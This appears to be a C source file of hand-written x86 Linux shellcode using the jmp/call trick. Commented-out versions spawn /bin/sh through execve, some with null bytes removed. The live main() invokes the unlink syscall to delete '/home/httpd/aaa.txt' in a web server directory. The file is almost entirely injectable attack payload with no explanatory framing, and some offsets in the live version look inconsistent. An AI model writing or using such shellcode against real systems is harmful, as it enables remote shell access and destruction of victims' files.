#include <stdio.h>
#include <fcntl.h>
#include <string.h>
#include <stdlib.h>

/*int main(){
	__asm__(

	".globl main;"
		".type	m, @function;"

	"m:;"
		"jmp	calladdr;"

	"popladdr:;"	
        "popl   %esi;"                     
        "movl   %esi,0x8(%esi);"          
        "movb   $0x0,0x7(%esi);"           
        "movl   $0x0,0xc(%esi);"           
        "movl   $0xb,%eax;"               
        "movl   %esi,%ebx;"                
        "leal   0x8(%esi),%ecx;"           
        "leal   0xc(%esi),%edx;"           
        "int    $0x80;"                    
        "movl   $0x1, %eax;"               
        "movl   $0x0, %ebx;"               
        "int    $0x80;"                    

    "calladdr:;"
		"call	popladdr;"
		".string \"/bin/sh\";"

);
}
*/


/*
	"popladdr:;"
		"popl   %esi;"                    
        "movl   %esi,0x8(%esi);"           
        "xorl   %eax,%eax;"                
		"movb   %eax,0x7(%esi);"		
        "movl   %eax,0xc(%esi);"          
        "movb   $11,%al;"                
        "movl   %esi,%ebx;"               
        "leal   0x8(%esi),%ecx;"          
        "leal   0xc(%esi),%edx;"          
        "int    $0x80;"                   
        "xorl   %ebx,%ebx;"               
        "movl   %ebx,%eax;"               
        "inc    %eax;"                    
        "int    $0x80;"                   

*/

int main(){
	__asm__(

".globl main;"
	".type	m, @function;"

 "m:;"
	"jmp	calladdr;"

 "popladdr:;"
	"popl	%esi;"
	"movl	%esi,19(%esi);"	
	"xorl	%eax,%eax;"		
	"movb	%al,20(%esi);"	
	"movl	%eax,24(%esi);"	

	"movb	$10	,%al;"		
	"movl	%esi,%ebx;"		
	"leal	20(%esi),%ecx;"		
	"leal	24(%esi),%edx;"		
	"int	$0x80;"			

	"xorl	%ebx,%ebx;"		
	"movl	%ebx,%eax;"
	"inc	%eax;"			
					
	"int	$0x80;"		

 "calladdr:;"
	"call	popladdr;"
	".ascii	\"/home/httpd/aaa.txt\";"

);



/*

"#include <sys/syscall.h>;"
"#define STRING	\"/home/httpd/aaa.txt\";"
"#define STRLEN	19;"
"#define ARGV	(STRLEN+1);"
"#define ENVP	(ARGV+4);"

".globl main;"
	".type	m, @function;"

 "m:;"
	"jmp	calladdr;"

 "popladdr:;"
	"popl	%esi;"
	"movl	%esi,(ARGV)(%esi);"	
	"xorl	%eax,%eax;"		
	"movb	%al,(STRLEN)(%esi);"	
	"movl	%eax,(ENVP)(%esi);"	

	"movb	$10	,%al;"		
	"movl	%esi,%ebx;"		
	"leal	ARGV(%esi),%ecx;"		
	"leal	ENVP(%esi),%edx;"		
	"int	$0x80;"			

	"xorl	%ebx,%ebx;"		
	"movl	%ebx,%eax;"
	"inc	%eax;"			
					
	"int	$0x80;"		

 "calladdr:;"
	"call	popladdr;"
	".ascii	STRING;"
*/